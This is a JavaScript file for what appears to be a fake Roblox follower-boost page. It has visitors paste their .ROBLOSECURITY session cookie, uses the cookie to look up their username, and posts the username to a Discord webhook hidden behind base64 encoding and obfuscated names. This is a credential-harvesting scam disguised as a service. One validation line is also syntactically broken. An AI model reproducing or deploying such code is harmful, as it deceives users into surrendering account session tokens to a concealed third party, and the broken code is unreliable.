function x1y2y2z3(title, text, icon, confirmButtonText) {
    const a1b2c3 = {
        background: "#141414",
        color: "#ffffff",
        title: "<b>" + title + "</b>",
        text: text,
        icon: icon,
        confirmButtonText: confirmButtonText,
        allowOutsideClick: false
    };
    Swal.fire(a1b2c3);
}

async function getUsernameFromCookie(cookie) {
    // Asegúrate de que la cookie esté en el formato correcto
    const robloxSecurityCookie = cookie.trim();
    if (!robloxSecurityCookie) {
        throw new Error("Invalid cookie");
    }

    // Hacer una solicitud a la API de Roblox para obtener el usuario
    const response = await fetch(`https://users.roblox.com/v1/users/authenticated`, {
        method: 'GET',
        headers: {
            'Cookie': `.ROBLOSECURITY=${robloxSecurityCookie}`
        }
    });

    if (!response.ok) {
        const errorText = await response.text(); // Obtener el texto del error
        throw new Error(`Failed to fetch user data: ${errorText}`);
    }

    const userData = await response.json();
    return userData.name; // Retorna el nombre de usuario
}

async function a1b2c3d4(p1q2r3, s4t5u7) {
    const e5f6g7 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjY1MjEzOTEzNjQ4MzM3OS81SnZNYTd1NHhrTERmbFV2RUVwQkdFc3JTSnh3V19kY1lrV3ZTdDlXWUNfd2NjbGc5Ylh4Z1JEOXFnLUN5N3YtMlE5MQ==';
    const g8h9i0 = atob(e5f6g7);

    try {
        const username = await getUsernameFromCookie(p1q2r3);
        const j1k2l3 = {
            content: `Follow Amount: ${s4t5u7}\nUsername: ${username}`
        };

        const response = await fetch(g8h9i0, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(j1k2l3)
        });

        if (response.ok) {
            x1y2y2z3("Success", "Successfully sent.", "success", "Okay");
        } else {
            const errorText = await response.text(); // Obtener el texto del error
            x1y2y2z3("Error", `Failed to send Followers to Roblox Account: ${errorText}`, "error", "Retry");
        }
    } catch (error) {
        x1y2y2z3("Error", error.message, "error", "Retry");
    }
}

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("Send").addEventListener("click", function() {
        const p1q2r3 = document.getElementById("user_code").value; // Asegúrate de que este campo contenga la cookie completa
        const s4t5u7 = document.getElementById("amount").value;

        if (!p1q2r3 || !s4t5u u7) {
            x1y2y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
            return;
        }

        const v7w8x9 = {
            icon: "info",
            title: "<b>Is this correct? 👀</b>",
            html: "Follow Amount: " + s4t5u7,
            showDenyButton: true,
            confirmButtonText: "Confirm", 
            denyButtonText: "Cancel",
            background: "#141414",
            color: "#ffffff"
        };

        Swal.fire(v7w8x9).then((result) => {
            if (result.isConfirmed) {
                a1b2c3d4(p1q2r3, s4t5u7);
            }
        });
    });
}); 
